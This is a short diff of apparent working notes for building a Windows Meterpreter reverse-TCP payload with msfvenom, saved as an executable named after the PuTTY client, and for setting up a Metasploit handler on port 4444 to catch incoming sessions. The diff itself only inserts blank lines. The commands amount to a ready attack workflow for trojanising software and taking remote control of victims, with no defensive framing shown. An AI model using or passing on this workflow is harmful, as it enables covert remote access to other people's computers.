@@ -5,10 +5,15 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o putty.
 
 msfconsole
 /session send msf  use exploit/multi/handler
+
 /session send msf  set payload windows/meterpreter/reverse_tcp
+
 /session send msf  set LHOST IP     # hoặc 0.0.0.0 / interface cụ thể nếu máy có nhiều IP
+
 /session send msf  set LPORT 4444
+
 /session send msf  set ExitOnSession false
+
 /session send msf  exploit -j -z
 
 
